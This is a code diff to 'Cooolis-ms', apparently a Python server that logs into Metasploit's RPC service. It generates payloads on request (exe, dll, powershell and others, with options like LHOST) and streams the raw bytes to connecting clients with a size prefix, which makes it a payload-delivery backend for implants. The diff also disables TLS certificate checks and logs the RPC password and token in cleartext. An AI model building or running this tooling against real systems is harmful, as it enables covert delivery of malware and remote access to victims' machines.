@@ -12,9 +12,11 @@ import ssl
 import sys
 import json
 import term
-
+import struct
 from socketserver import BaseRequestHandler,ThreadingTCPServer
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 ssl._create_default_https_context = ssl._create_unverified_context
 
 
@@ -45,6 +47,7 @@ class Metasploit_RPC(BaseRequestHandler):
             cls(request, client_address, server, *args, **kwargs)
         return _HandlerCreator
 
+
     def _request(self,options):
         try:
             term.writeLine("[*]API URL : {url} , Method : {method}".format(url=self.url,method=options[0]), term.green)
@@ -57,6 +60,7 @@ class Metasploit_RPC(BaseRequestHandler):
                 return result
         except Exception as e:
             sys.stderr.write(str(e)+"\nRef:https://metasploit.help.rapid7.com/docs/standard-api-methods-referenc\n")
+    
 
     def _get_token(self):
         options = ["auth.login",self.username,self.password]
@@ -64,15 +68,18 @@ class Metasploit_RPC(BaseRequestHandler):
         result = self._request(options)
         self.token = str(result[b'token'],encoding = "utf8")
         term.writeLine("[*]Token: {token} Username : {username} Password : {password}".format(token=self.token,username=self.username,password=self.password),term.green)
+    
+    # 打包数据
     def __pack(self,pack_str):
         return msgpack.packb(pack_str)
-
+    
+    # 解包数据
     def __unpack(self,pack_str):
         return msgpack.unpackb(pack_str)
 
-    def __send_payload(self,options):
-        term.writeLine("[*]PAYLOAD: {payload}".format(payload=options['payload']),term.green)
-        pack_data = ["module.execute",self.token,"payload",options['payload'],options]
+    def __send_payload(self,payload,options):
+        term.writeLine("[*]PAYLOAD: {payload}".format(payload=payload),term.green)
+        pack_data = ["module.execute",self.token,"payload",payload,options]
         return self._request(pack_data)
 
     def handle(self):
@@ -81,27 +88,47 @@ class Metasploit_RPC(BaseRequestHandler):
         while True:
             data = self.request.recv(1024)
             if not data:break
-            data = data.decode()
-            data = json.loads(data)
-            payload = self.__send_payload(data)
-            term.writeLine("[*]PAYLOAD size: {size}".format(size=len(payload[b'payload'])),term.green)
-            self.request.send(payload[b'payload'])
+            try:
+                data = struct.unpack(">200s200s200sLHH",data)
+                # print(data)
+                options = {}
+                str_json = data[1].decode('UTF-8')
+                str_json = str_json.strip('\x00')
+                # print("Options : %s size : %d",str_json,len(str_json))
+                for x in str_json.split(','):
+                    k,v = x.split('=',2)
+                    # print(k,":",v)
+                    options.update({k.strip():v.strip()})
+                payload = data[0].decode('UTF-8')
+                payload = payload.strip('\x00')
+                # print("Payload : %s Options : %s " % (payload,options['LHOST']))
+                recv_payload = self.__send_payload(payload,options)
+                # print("Send ..  %s ",recv_payload)
+                payload_size = len(recv_payload[b'payload'])
+                self.request.send(payload_size.to_bytes(4,byteorder='little',signed=False))
+                self.request.send(recv_payload[b'payload'])
+                self.request.close()
+            except Exception as e:
+                term.writeLine("[!]{error}".format(error=str(e)),term.red)
+                pass
+            finally:
+                break
 
 def main():
     example = 'Example:\n\n$ python3 server.py -U msf -P msf -v -s -l 4444'
     args = ArgumentParser(prog='Cooolis-ms',epilog=example)
     args.add_argument('-U','--username',help='Metasploit web service username',required=True)
     args.add_argument('-P','--password',help='Metasploit web service password',required=True)
-    args.add_argument('-H','--host',help='Metasploit web service host',default='localhost')
-    args.add_argument('-p','--port',help='Metasploit RPC service port',default=55553,type=int)
-    args.add_argument('-S','--server',help='Payload sender listen host',default='localhost')
-    args.add_argument('-l','--listen',help='Payload listen port',default=1111,type=int)
-    args.add_argument('-u','--uri',help='Metasploit RPC service uri',default='/api/1.0/')
+    args.add_argument('-H','--host',help='Metasploit web service host, Default: localhost',default='localhost')
+    args.add_argument('-p','--port',help='Metasploit RPC service port, Default: 55553',default=55553,type=int)
+    args.add_argument('-S','--server',help='Payload sender listen host, Default: localhost',default='localhost')
+    args.add_argument('-l','--listen',help='Payload listen port, Default: 1111',default=1111,type=int)
+    args.add_argument('-u','--uri',help='Metasploit RPC service uri, Default: /api/1.0/',default='/api/1.0/')
     args.add_argument('-t','--type',help='Payload Type',choices=('exe','ruby','c','dll','vbs','powershell'))
-    args.add_argument('-s','--ssl',help='Enable ssl',action="store_true",default=True)
+    args.add_argument('-s','--ssl',help='Enable ssl, Default: True',action="store_true",default=True)
     args.add_argument('-v','--versobe',help='Enable debug',action="store_true")
     parser = args.parse_args()
-    term.writeLine("[*]Server Host : {host} , Server Port : {port}".format(host=parser.server,port=parser.port), term.green)
+    term.writeLine("[*]Server Host : {host} , Server Port : {port}".format(host=parser.server,port=parser.listen), term.green)
     server = ThreadingTCPServer((parser.server,parser.listen),Metasploit_RPC.Creator(parser))
     server.serve_forever()
     
